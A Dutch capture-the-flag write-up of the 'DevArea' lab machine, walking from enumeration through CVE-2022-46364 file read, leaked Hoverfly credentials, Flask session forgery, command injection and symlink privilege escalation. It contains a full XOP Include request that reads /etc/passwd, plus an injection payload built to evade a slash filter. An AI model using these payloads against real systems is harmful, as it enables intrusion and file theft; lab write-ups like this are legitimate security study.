# DevArea

In de initiële enumeratie kom ik de volgende dingen tegen:

- Een company website, hier zit wel een login knop op maar niks werkt/wordt
  ingeladen
- Een jetty server op `:8080`, `jetty@v9.4.27`
- Hoverfly login pagina op `:8888`
- Een proxy server van iets op `:8500`
  - Lezen naar wat hoverfly nou doet lijkt het er op dat het een proxy server
    aanbied. Ik vermoed dous dat `:8888` en `:8500` onderdeel zijn van
    hetzelfde product.
  - Calls maken met de proxy server geeft `407 Proxy authentication required`
    terug

# CVE-2025-54123

Met wat rondzoeken vind ik
[cve-2025-54123](https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-r4h8-hfp2-ggmf).
Ik weet nog niet wat de versie van hoverfly is maar dit is waard om te proberen.

Snelle test later en dit lijkt niet te werken. Krijg een 401 als repsonse wat
anders is dan de verwachte response vanuit de advisory.

De exploit lokaal gevalideerd zodat ik zeker weet dat het command werkt. Lokaal
kan ik een vatbare versie exploiteren maar dit werkt niet met de devarea box.
Dit is dus een verkeerde vector en ik moet iets anders proberen.

# Nmap

Ik heb niet goed naar de nmap output gekeken. Er is een FTP server die
`anonymous` login ondersteund. Op deze FTP server vind ik een
`employee-service.jar` bestand.

# CVE-2022-46364

Dit lijkt wel een goede richting te zijn. Hiermee heb ik een exploit te pakken
met local file-read. Hiervoor moet wel een heel specifiek request opgebouwd
worden.

```req
POST /employeeservice HTTP/1.1
Host: devarea.htb:8080
User-Agent: curl/8.15.0
Accept: */*
Content-Type: multipart/related; boundary="MIME_boundary"; type="application/xop+xml"; start="example@example.com>"; start-info="text/xml"
Content-Length: 667
Connection: close

--MIME_boundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <example@example.com>

<soapenv:Envelope
	xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
	xmlns:xop="http://www.w3.org/2004/08/xop/include"
	xmlns:tns="http://devarea.htb/">
<soapenv:Header/>
<soapenv:Body>
	<tns:submitReport>
		<arg0>
			<employeeName>freckles</employeeName>
			<department>
				<xop:Include href="file:///etc/passwd" />
			</department>
			<content>test</content>
			<confidential>false</confidential>
		</arg0>
	</tns:submitReport>
</soapenv:Body>
</soapenv:Envelope>

--MIME_boundary--
```

> De `xop:Include` kan hier gebruikt worden om bestanden op de server uit te
> lezen. Als ik de documentatie goed lees zou puur de
> `Content-Type: application/xop+xml` genoeg moeten zijn.

## Foothold

```bash
# /etc/passwd
root:x:0:0:root:/root:/bin/bash
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
```

Dit werkt ook met file listing! Dit maakt het wat makkelijker om te zoeken naar
leuke info.

Met zoeken naar waar info draait en hoe het draait het volgende geprobeerd:

- Kijken voor een `/etc/nginx`, dit is er niet
- `/var/www/html` folder bekeken en hier staat alleen de company website
- `/opt` Hier vind ik de employeeservice en hoverfly
  - Dit draait dus niet (_waarschijnlijk_) via een docker container of iets
    dergelijks
- `/etc/systemd/system` of het misschien via systemd gestart wordt
  - Hier kom ik zowel een `employee-service.service` en `hoverfly.service` tegen

```service
# employee-service.service
[Unit]
Description=Employee Service (Java CXF + Jetty)
After=network.target

[Service]
User=dev_ryan
WorkingDirectory=/home/dev_ryan
InaccessiblePaths=/home/dev_ryan/user.txt
ProtectHome=false
ExecStart=/usr/lib/jvm/java-8-openjdk-amd64/bin/java -jar /opt/EmployeeService/target/employee-service.jar
SuccessExitStatus=143
Restart=on-failure
RestartSec=5
StandardOutput=journal
StandardError=journal
Environment=JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64

[Install]
WantedBy=multi-user.target
```

```service
# Hoverfly service
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0

Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

In de hoverfly service staan de auth gegevens en nu kan ik daar dus inloggen met
`admin:O7IJ27MyyXiU`, dit kan ik waarschijnlijk ook voor de proxy gebruiken.
Maar ook voor het endpoint uit de eerste CVE.

Jep, hiermee hebben we een RCE te pakken!

Simpele revshell later en we hebben toegang

# Privesc

Met `sudo -l` zien we dat we syswatch commando's mogen uitvoeren. In `~` staat
ook een zipfile met de contents van deze service en via `ss -tnlp` zien we dat
de service ook daadwerkelijk op poort `:7777` draait. Via de proxy van hoverfly
kunnen we dit benaderen ook al is dit op `127.1` gebind en niet op `0.0`.

> Proxy draait op de server en dan komen we dus via `127.1` binnen ;)

In de zipfile staat ook een hash voor de inlog op deze service:

```
admin:scrypt:32768:8:1$IyKfiteB3TNFK6Hv$a0fbf5283db6a13859776827133e99d4d5ab43e85bedd05b06119e6fdca096ac81570d4497a836d09a155884182b6442cfcf6986b96310b514f34d9da871cb70
```

> _dit kraakte uiteindelijk naar wachtwoord admin..._

## Session overname

We weten dat de GUI draait en uit de service kunnen we de secret key halen voor
flask. Wat dus kan is:

- Dit lokaal draaien, we hebben immers de code
- Hierbij de secret voor flask identiek maken aan de server
- Eenmaal lokaal ingelogd de `session` cookie kopiëren naar de target
- Omdat de secrets hetzelfde zijn hebben we nu een valide sessie

In de code kijkend voor de `app.py` van deze flask service zit er een heel mooi
service status endpoint die een `subprocess.run` doet. Waarschijnlijk hebben we
hiermee rce te pakken.

Met pijn en moeite kunnen we hier de whitelist omzeilen. Misschien kunnen we de
code zo ver krijgen om een `script.sh` toe te voegen die we dan als root kunnen
uitvoeren.

Dit uiteindelijk gedaan door als de shell van `dev_ryan` een bestand in
`/tmp/fff/script` aan te maken om mijn hele payload in op te slaan. Dan kon ik
via het volgende dit script aanroepen:

```
POST /service-status
service=meuk||bash -c "$(pwd|cut -c1-1)tmp$(pwd|cut -c1-1)fff$(pwd|cut -c1-1)script"
```

> - `service=meuk` zorgt ervoor dat het klapt waardoor alles na `||` draait
> - `bash -c ""` bevat het path naar het script, via `$(pwd | cut -c-1)` krijgen
>   we een `/`. Kunnen niet direct een slash gebruiken omdat de server dit
>   filtered.

Hier een revshell in zetten en we hebben toegang tot de `syswatch` user en alles
waar deze user bij mag.

## Via de conf?

Verder kijkend naar de code in de shell scripts zie ik dat voor het monitoren
van de logs plugin er een `syswatch.conf` bestand gesourced wordt in bash. Nu
vermoed ik dat de syswatch user waar ik toegang tot heb weten te krijgen via
bovenstaande dit bestand kan aanpassen. Dan kan ik hier dus logica inzetten die
uitgevoerd wordt en dan heb ik waarschijnlijk mijn privesc te pakken.

## Via logs en symlinks

Na verder valideren, we kunnen logs uit de `syswatch/logs` folder lezen. Hier
kunnen we symlinks als de `syswatch` user in plaatsen maar deze worden
gevalideerd. Kortom een symlink naar `/root` werkt niet want er is een check op
bijvoorbeeld `/`.

Kortom we moeten dus een symlink maken naar een bestand in de `syswatch/logs`
folder maar we kunnen hier natuurlijk een symlink maken naar een symlink. Dan is
het puur de sudo call gebruiken die we als `dev_ryan` mogen uitvoeren om de log
te lezen en we hebben de root flag.
